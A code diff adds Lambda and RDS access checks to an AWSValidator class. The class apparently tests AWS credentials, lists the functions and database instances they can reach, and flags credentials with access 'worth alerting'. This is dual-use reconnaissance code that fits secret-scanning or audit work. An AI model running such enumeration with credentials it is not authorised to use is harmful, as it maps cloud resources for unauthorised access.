@@ -697,6 +1475,50 @@ class AWSValidator:
         except ClientError as e:
             result["services"]["iam"] = {"accessible": False, "error": str(e)}
             self.logger.debug(f"IAM access check failed: {e}")
+    
+    async def _check_lambda_access(self, session, result: Dict[str, Any]):
+        """Check Lambda access"""
+        try:
+            lambda_client = session.client('lambda')
+            
+            # List functions
+            functions = lambda_client.list_functions()
+            function_list = functions.get('Functions', [])
+            
+            lambda_info = {
+                "accessible": True,
+                "function_count": len(function_list),
+                "functions": [func['FunctionName'] for func in function_list[:10]]  # First 10 functions
+            }
+            
+            result["services"]["lambda"] = lambda_info
+            self.logger.info(f"⚡ Lambda Access: {lambda_info['function_count']} functions found")
+            
+        except ClientError as e:
+            result["services"]["lambda"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"Lambda access check failed: {e}")
+    
+    async def _check_rds_access(self, session, result: Dict[str, Any]):
+        """Check RDS access"""
+        try:
+            rds_client = session.client('rds')
+            
+            # List DB instances
+            instances = rds_client.describe_db_instances()
+            instance_list = instances.get('DBInstances', [])
+            
+            rds_info = {
+                "accessible": True,
+                "instance_count": len(instance_list),
+                "instances": [inst['DBInstanceIdentifier'] for inst in instance_list[:10]]  # First 10 instances
+            }
+            
+            result["services"]["rds"] = rds_info
+            self.logger.info(f"🗄️ RDS Access: {rds_info['instance_count']} instances found")
+            
+        except ClientError as e:
+            result["services"]["rds"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"RDS access check failed: {e}")
     
     def _has_significant_access(self, result: Dict[str, Any]) -> bool:
         """Determine if the credentials have significant access worth alerting"""
